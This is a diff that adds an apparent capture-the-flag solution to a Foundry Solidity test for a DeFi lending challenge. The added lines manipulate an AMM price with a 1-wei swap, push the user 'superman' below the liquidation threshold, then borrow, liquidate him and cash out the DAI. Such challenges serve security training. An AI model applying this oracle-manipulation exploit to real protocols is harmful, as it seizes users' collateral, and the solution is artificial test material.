@@ -86,8 +86,20 @@ contract Challenge8Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge8Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
+        console.log("superman's health factor at the very beginning: ", oiler.healthFactor(superman));
+        // superman is right on the liquidation threshold
+        
+        // Dump 1 wei of Token
+        token.approve(address(amm), 1);
+        amm.swap(address(token), 1);
+        console.log("superman's health factor after Token dump: ", oiler.healthFactor(superman));
+        // superman's collateral can be liquidated
+        token.approve(address(oiler), 4);
+        oiler.deposit(4);
+        oiler.borrow(3);
+        oiler.liquidate(address(superman));
+        dai.approve(address(amm), type(uint256).max);
+        amm.swap(address(dai), dai.balanceOf(player));
 
         //==================================================//
         vm.stopPrank();
